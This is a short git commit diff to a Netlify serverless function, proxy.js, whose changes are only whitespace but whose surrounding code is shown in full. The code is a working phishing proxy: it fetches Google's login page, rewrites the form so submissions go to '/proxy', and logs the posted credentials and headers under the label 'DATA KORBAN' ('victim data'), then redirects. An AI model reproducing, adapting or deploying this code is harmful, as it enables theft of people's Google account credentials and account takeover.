6a3aad04a8f4bb603fb52680e4dca1ab9262551c
guest6vi7vii-png <guest6vi7vii@gmail.com>
2026-05-28 12:55:26 +0700

    Update proxy.js

--- netlify/functions/proxy.js
+++ netlify/functions/proxy.js
@@ -2,10 +2,10 @@ exports.handler = async (event) => {
   if (event.httpMethod === "POST") {
     const body = event.body;
     const headers = event.headers;
-    
+
     console.log("DATA KORBAN:", body);
     console.log("HEADERS:", headers);
-    
+
     return {
       statusCode: 302,
       headers: {
@@ -14,19 +14,17 @@ exports.handler = async (event) => {
       body: ""
     };
   }
-  
+
   const target = "https://accounts.google.com/login";
-  
   const res = await fetch(target, {
     headers: {
       "User-Agent": event.headers["user-agent"]
     }
   });
-  
+
   let html = await res.text();
-  
   html = html.replace(/action="[^"]*"/, `action="/proxy"`);
-  
+
   return {
     statusCode: 200,
     headers: { "content-type": "text/html" },
